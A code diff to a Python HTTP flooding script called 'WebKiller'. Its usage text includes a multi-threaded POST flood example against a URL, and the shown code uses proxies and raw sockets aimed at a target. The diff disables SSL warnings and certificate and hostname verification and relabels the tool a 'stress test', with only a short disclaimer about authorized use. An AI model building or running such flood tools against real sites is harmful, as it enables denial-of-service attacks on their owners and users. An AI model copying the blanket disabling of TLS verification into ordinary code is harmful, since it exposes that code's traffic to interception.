@@ -17,11 +17,18 @@ import json
 import hashlib
 import base64
 import urllib.parse
+import warnings
+import urllib3
 from threading import Thread, Event
 from collections import defaultdict
 from concurrent.futures import ThreadPoolExecutor
 import http.client
 import ipaddress
+
+# ===== NONAKTIFKAN WARNING SSL =====
+warnings.filterwarnings('ignore')
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+# ===================================
 
 # Warna terminal
 class Colors:
@@ -48,7 +55,7 @@ BANNER = f"""
 ║   ╚███╔███╔╝███████╗██████╔╝    ██║  ██╗██║███████╗███████╗║
 ║    ╚══╝╚══╝ ╚══════╝╚═════╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝║
 ║                                                              ║
-║                                                                  ║
+║              WEB KILLER v{VERSION} - STRESS TEST              ║
 ║                   CPA TOOLS DEVELOPMENT                      ║
 ╚══════════════════════════════════════════════════════════════╝
 {Colors.END}"""
@@ -101,6 +108,7 @@ class WebKiller:
         self.config = Config()
         self.running = False
         self.threads = []
+        self.payloads = []
         
     def parse_args(self):
         """Parse command line arguments"""
@@ -246,7 +254,7 @@ class WebKiller:
                     'headers': headers,
                     'proxies': proxy,
                     'timeout': self.config.timeout,
-                    'verify': False,
+                    'verify': False,  # Nonaktifkan verifikasi SSL
                     'allow_redirects': False,
                 }
                 
@@ -319,6 +327,8 @@ class WebKiller:
                 
                 if self.config.use_https:
                     context = ssl.create_default_context()
+                    context.check_hostname = False
+                    context.verify_mode = ssl.CERT_NONE
                     sock = context.wrap_socket(sock, server_hostname=self.config.target_ip)
                     
                 sock.connect((self.config.target_ip, self.config.target_port))
@@ -563,9 +573,6 @@ class WebKiller:
   
   # POST flood with custom data
   python webkiller.py --url https://api.example.com --method POST --data "key=value" --threads 50
-  
-  # With custom headers and cookies
-  python webkiller.py --url http://example.com --header "X-API-Key: 123" --cookie "session=abc123"
 
 {Colors.YELLOW}⚠️  WARNING: For educational and authorized testing only!{Colors.END}
 {Colors.RED}⚠️  Do not use for illegal purposes!{Colors.END}
@@ -575,6 +582,10 @@ def main():
     print(BANNER)
     print(f"{Colors.RED}⚠️  WARNING: For educational and authorized testing only!{Colors.END}")
     print(f"{Colors.RED}⚠️  Do not use for illegal purposes!{Colors.END}\n")
+    
+    # Nonaktifkan warning
+    warnings.filterwarnings('ignore')
+    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
     
     killer = WebKiller()
     killer.parse_args()
